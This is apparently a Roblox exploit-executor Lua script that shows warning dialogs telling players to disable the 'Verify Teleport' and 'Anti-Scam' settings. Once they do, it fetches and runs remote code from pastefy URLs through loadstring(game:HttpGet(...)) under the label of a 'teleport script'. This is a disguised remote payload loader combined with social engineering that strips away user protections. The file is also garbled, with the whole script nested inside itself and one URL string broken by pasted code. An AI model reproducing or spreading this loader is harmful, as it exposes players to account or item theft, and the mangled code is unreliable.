--// Services 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUIs
for _, guiName in pairs({"DeltaWarningGUI", "DeltaConfirmGUI", "InstructionGUI"}) do
    if PlayerGui:FindFirstChild(guiName) then
        PlayerGui[guiName]:Destroy()
    end
end

-- Show warning GUI
local function showWarning()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaWarningGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -16, 0, 40)
    title.Position = UDim2.new(0, 8, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "⚠ Turn off all Delta settings ⚠"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(255, 85, 85)
    title.Parent = mainFrame

    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, -16, 0, 120)
    info.Position = UDim2.new(0, 8, 0, 50)
    info.BackgroundTransparency = 1
    info.Text = "1. Disable Verify Teleport\n2. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
    info.TextColor3 = Color3.fromRGB(220,220,220)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.TextYAlignment = Enum.TextYAlignment.Top
    info.TextSize = 16
    info.Font = Enum.Font.Gotham
    info.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -55)
    okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showConfirmation()
    end)
end

-- Second confirmation (Yes/No)
function showConfirmation()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaConfirmGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "Are you really sure you turned everything off?"
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 18
    label.Font = Enum.Font.GothamBold
    label.Parent = mainFrame

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0, 120, 0, 40)
    yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    yesBtn.Text = "Yes"
    yesBtn.TextColor3 = Color3.fromRGB(255,255,255)
    yesBtn.Parent = mainFrame
    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0, 120, 0, 40)
    noBtn.Position = UDim2.new(0.75, -60, 1, -50)
    noBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
    noBtn.Text = "No"
    noBtn.TextColor3 = Color3.fromRGB(255,255,255)
    noBtn.Parent = mainFrame
    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)

    yesBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showInstructions()
    end)

    noBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showWarning()
    end)
end

-- Instruction prompt (before teleport)
function showInstructions()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "InstructionGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "📌 Instructions:\n- Make sure your settings are off.\n- Follow steps carefully so the script will work.\n- If the script is not showing wait 2-3 mins or execute it again."
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 16
    label.TextWrapped = true
    label.Font = Enum.Font.Gotham
    label.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -50)
    okBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        -- Run Teleporter Script
        local success, err = pcall(function()
            --// Services 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUIs
for _, guiName in pairs({"DeltaWarningGUI", "DeltaConfirmGUI", "InstructionGUI"}) do
    if PlayerGui:FindFirstChild(guiName) then
        PlayerGui[guiName]:Destroy()
    end
end

-- Show warning GUI
local function showWarning()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaWarningGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -16, 0, 40)
    title.Position = UDim2.new(0, 8, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "⚠ Turn off all Delta settings ⚠"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(255, 85, 85)
    title.Parent = mainFrame

    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, -16, 0, 120)
    info.Position = UDim2.new(0, 8, 0, 50)
    info.BackgroundTransparency = 1
    info.Text = "1. Disable Verify Teleport\n2. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
    info.TextColor3 = Color3.fromRGB(220,220,220)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.TextYAlignment = Enum.TextYAlignment.Top
    info.TextSize = 16
    info.Font = Enum.Font.Gotham
    info.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -55)
    okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showConfirmation()
    end)
end

-- Second confirmation (Yes/No)
function showConfirmation()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaConfirmGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "Are you really sure you turned everything off?"
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 18
    label.Font = Enum.Font.GothamBold
    label.Parent = mainFrame

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0, 120, 0, 40)
    yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    yesBtn.Text = "Yes"
    yesBtn.TextColor3 = Color3.fromRGB(255,255,255)
    yesBtn.Parent = mainFrame
    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0, 120, 0, 40)
    noBtn.Position = UDim2.new(0.75, -60, 1, -50)
    noBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
    noBtn.Text = "No"
    noBtn.TextColor3 = Color3.fromRGB(255,255,255)
    noBtn.Parent = mainFrame
    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)

    yesBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showInstructions()
    end)

    noBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showWarning()
    end)
end

-- Instruction prompt (before teleport)
function showInstructions()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "InstructionGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "📌 Instructions:\n- Make sure your settings are off.\n- Follow steps carefully so the script will work.\n- If the script is not showing wait 2-3 mins or execute it again."
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 16
    label.TextWrapped = true
    label.Font = Enum.Font.Gotham
    label.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -50)
    okBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        -- Run Teleporter Script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw--// Services 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Remove old GUIs
for _, guiName in pairs({"DeltaWarningGUI", "DeltaConfirmGUI", "InstructionGUI"}) do
    if PlayerGui:FindFirstChild(guiName) then
        PlayerGui[guiName]:Destroy()
    end
end

-- Show warning GUI
local function showWarning()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaWarningGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -16, 0, 40)
    title.Position = UDim2.new(0, 8, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "⚠ Turn off all Delta settings ⚠"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(255, 85, 85)
    title.Parent = mainFrame

    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, -16, 0, 120)
    info.Position = UDim2.new(0, 8, 0, 50)
    info.BackgroundTransparency = 1
    info.Text = "1. Disable Verify Teleport\n2. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
    info.TextColor3 = Color3.fromRGB(220,220,220)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.TextYAlignment = Enum.TextYAlignment.Top
    info.TextSize = 16
    info.Font = Enum.Font.Gotham
    info.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -55)
    okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showConfirmation()
    end)
end

-- Second confirmation (Yes/No)
function showConfirmation()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DeltaConfirmGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "Are you really sure you turned everything off?"
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 18
    label.Font = Enum.Font.GothamBold
    label.Parent = mainFrame

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0, 120, 0, 40)
    yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    yesBtn.Text = "Yes"
    yesBtn.TextColor3 = Color3.fromRGB(255,255,255)
    yesBtn.Parent = mainFrame
    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0, 120, 0, 40)
    noBtn.Position = UDim2.new(0.75, -60, 1, -50)
    noBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
    noBtn.Text = "No"
    noBtn.TextColor3 = Color3.fromRGB(255,255,255)
    noBtn.Parent = mainFrame
    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)

    yesBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showInstructions()
    end)

    noBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        showWarning()
    end)
end

-- Instruction prompt (before teleport)
function showInstructions()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "InstructionGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -16, 0, 120)
    label.Position = UDim2.new(0, 8, 0, 8)
    label.BackgroundTransparency = 1
    label.Text = "📌 Instructions:\n- Make sure your settings are off.\n- Follow steps carefully so the script will work.\n- If the script is not showing wait 2-3 mins or execute it again."
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 16
    label.TextWrapped = true
    label.Font = Enum.Font.Gotham
    label.Parent = mainFrame

    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 160, 0, 40)
    okBtn.Position = UDim2.new(0.5, -80, 1, -50)
    okBtn.BackgroundColor3 = Color3.fromRGB(0,170,85)
    okBtn.Text = "Okay"
    okBtn.TextColor3 = Color3.fromRGB(255,255,255)
    okBtn.TextSize = 18
    okBtn.Font = Enum.Font.GothamBold
    okBtn.Parent = mainFrame
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

    okBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        -- Run Teleporter Script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/WZWTQGC4/raw"))()
        end)
        if success then
            print("✅ Teleport script loaded successfully")
        else
            warn("Teleport script failed: ".. tostring(err))
        end
        shared.TeleportDone = true
    end)
end

-- Start the GUI flow
showWarning()
        end)
        if success then
            print("✅ Teleport script loaded successfully")
        else
            warn("Teleport script failed: ".. tostring(err))
        end
        shared.TeleportDone = true
    end)
end

-- Start the GUI flow
showWarning()
        end)
        if success then
            print("✅ Teleport script loaded successfully")
        else
            warn("Teleport script failed: ".. tostring(err))
        end
        shared.TeleportDone = true
    end)
end

-- Start the GUI flow
showWarning()
